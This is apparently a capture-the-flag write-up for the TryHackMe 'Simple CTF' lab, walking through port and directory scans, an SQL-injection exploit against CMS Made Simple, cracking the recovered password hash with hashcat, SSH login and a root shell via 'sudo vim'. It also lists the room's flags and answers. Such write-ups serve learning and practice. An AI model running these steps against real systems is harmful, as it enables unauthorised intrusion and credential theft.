# Simple CTF

**Date:** 06, June, 2021

**Author:** Dhilip Sanjay S

---

[Click Here](https://tryhackme.com/room/brainpan) to go to the TryHackMe room.

## Enumeration

### Nmap

```bash
$ nmap -sC -sV -oN nmap.out 10.10.59.145
Nmap scan report for 10.10.59.145
Host is up (0.22s latency).
Not shown: 997 filtered ports
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.17.7.91
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 2 disallowed entries 
|_/ /openemr-5_0_1_3 
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 29:42:69:14:9e:ca:d9:17:98:8c:27:72:3a:cd:a9:23 (RSA)
|   256 9b:d1:65:07:51:08:00:61:98:de:95:ed:3a:e3:81:1c (ECDSA)
|_  256 12:65:1b:61:cf:4d:e5:75:fe:f4:e8:d4:6e:10:2a:f6 (ED25519)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

### Gobuster

```bash
$  gobuster dir -u http://10.10.59.145 -t 50 -w /usr/share/wordlists/dirb/common.txt | tee gobuster.out
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.59.145
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/06/06 18:11:21 Starting gobuster in directory enumeration mode
===============================================================
/.htpasswd            (Status: 403) [Size: 296]
/.htaccess            (Status: 403) [Size: 296]
/.hta                 (Status: 403) [Size: 291]
/index.html           (Status: 200) [Size: 11321]
/robots.txt           (Status: 200) [Size: 929]  
/server-status        (Status: 403) [Size: 300]  
/simple               (Status: 301) [Size: 313] [--> http://10.10.59.145/simple/]
                                                                                 
===============================================================
2021/06/06 18:11:41 Finished
===============================================================
```

---

### How many services are running under port 1000?
- **Answer:** 2

---

### What is running on the higher port?
- **Answer:** ssh

---

### What's the CVE you're using against the application?
- **Answer:** CVE-2019-9053
- **Steps to Reproduce:** 
    - Search for Vulnerabilities in the `CMS Made Simple 2.2.8` using `searchsploit` & then look for the CVE number in exploit db.

```bash
searchsploit CMS Made Simple 2.2.8
--------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                 |  Path
--------------------------------------------------------------------------------------------------------------- ---------------------------------
CMS Made Simple < 2.2.10 - SQL Injection                                                                       | php/webapps/46635.py
--------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

---

### To what kind of vulnerability is the application vulnerable?
- **Answer:** SQLi

---

### What's the password?
- **Answer:** secret
- **Steps to Reproduce:** 
- Run the exploit:

```bash
[+] Salt for password found: 1dac0d92e9fa6bb2
[+] Username found: mitch
[+] Email found: admin@admin.com
[+] Password found: 0c01f4468bd75d7a84c7eb73846e8d96
```

- Crack the hash:

```bash
$ hashcat -m 20 hash.txt --wordlist /usr/share/seclists/Passwords/Common-Credentials/best110.txt 
hashcat (v6.1.1) starting...

OpenCL API (OpenCL 1.2 pocl 1.6, None+Asserts, LLVM 9.0.1, RELOC, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
=============================================================================================================================
* Device #1: pthread-Intel(R) Core(TM) i7-8550U CPU @ 1.80GHz, 2884/2948 MB (1024 MB allocatable), 1MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256
Minimim salt length supported by kernel: 0
Maximum salt length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Applicable optimizers applied:
* Zero-Byte
* Early-Skip
* Not-Iterated
* Single-Hash
* Single-Salt
* Raw-Hash

ATTENTION! Pure (unoptimized) backend kernels selected.
Using pure kernels enables cracking longer passwords but for the price of drastically reduced performance.
If you want to switch to optimized backend kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory required for this attack: 64 MB

Dictionary cache built:
* Filename..: /usr/share/seclists/Passwords/Common-Credentials/best110.txt
* Passwords.: 110
* Bytes.....: 849
* Keyspace..: 110
* Runtime...: 0 secs

The wordlist or mask that you are using is too small.
This means that hashcat cannot use the full parallel power of your device(s).
Unless you supply more work, your cracking speed will drop.
For tips on supplying more work, see: https://hashcat.net/faq/morework

Approaching final keyspace - workload adjusted.  

0c01f4468bd75d7a84c7eb73846e8d96:1dac0d92e9fa6bb2:secret
                                                
Session..........: hashcat
Status...........: Cracked
Hash.Name........: md5($salt.$pass)
Hash.Target......: 0c01f4468bd75d7a84c7eb73846e8d96:1dac0d92e9fa6bb2
Time.Started.....: Sun Jun  6 22:14:13 2021 (0 secs)
Time.Estimated...: Sun Jun  6 22:14:13 2021 (0 secs)
Guess.Base.......: File (/usr/share/seclists/Passwords/Common-Credentials/best110.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   474.2 kH/s (0.03ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 110/110 (100.00%)
Rejected.........: 0/110 (0.00%)
Restore.Point....: 0/110 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: 000000 -> zxczxc

Started: Sun Jun  6 22:13:43 2021
Stopped: Sun Jun  6 22:14:15 2021
```
    
---

### Where can you login with the details obtained?
- **Answer:** ssh
- **Steps to Reproduce:** 

```bash
$ ssh mitch@10.10.129.112 -p 2222
The authenticity of host '[10.10.129.112]:2222 ([10.10.129.112]:2222)' can't be established.
ECDSA key fingerprint is SHA256:Fce5J4GBLgx1+iaSMBjO+NFKOjZvL5LOVF5/jc0kwt8.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[10.10.129.112]:2222' (ECDSA) to the list of known hosts.
mitch@10.10.129.112's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-58-generic i686)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

0 packages can be updated.
0 updates are security updates.

Last login: Mon Aug 19 18:13:41 2019 from 192.168.0.190
$ whoami
mitch

```

---

### What's the user flag?
- **Answer:** G00d j0b, keep up!
- **Steps to Reproduce:** 

```bash
$ ls
user.txt
$ cat user.txt  
G00d j0b, keep up!
```

---

### Is there any other user in the home directory? What's its name?
- **Answer:** 
- **Steps to Reproduce:** 

```bash
$ cd ..
$ ls
mitch  sunbath
```

---

### What can you leverage to spawn a privileged shell?
- **Answer:** vim
- **Steps to Reproduce:** 
    - Check the files with **SUID** bit set:

    ```bash
    $ find / -perm -u=s 2>/dev/null
    /bin/su
    /bin/ping
    /bin/mount
    /bin/umount
    /bin/ping6
    /bin/fusermount
    /usr/bin/passwd
    /usr/bin/pkexec
    /usr/bin/newgrp
    /usr/bin/chfn
    /usr/bin/sudo
    /usr/bin/gpasswd
    /usr/bin/chsh
    /usr/lib/openssh/ssh-keysign
    /usr/lib/policykit-1/polkit-agent-helper-1
    /usr/lib/eject/dmcrypt-get-device
    /usr/lib/xorg/Xorg.wrap
    /usr/lib/snapd/snap-confine
    /usr/lib/i386-linux-gnu/oxide-qt/chrome-sandbox
    /usr/lib/dbus-1.0/dbus-daemon-launch-helper
    /usr/sbin/pppd
    ```
    
    - Check sudo permissions:

    ```bash
    $ sudo -l
    User mitch may run the following commands on Machine:
        (root) NOPASSWD: /usr/bin/vim
    ```

---

### What's the root flag?
- **Answer:** W3ll d0n3. You made it!
- **Steps to Reproduce:** 
    - Use vim to escalate privileges:

```bash
$ sudo vim -c ':!/bin/sh'

# whoami 
root
# cd /root      
# ls
root.txt
# cat root.txt  
W3ll d0n3. You made it!
```

---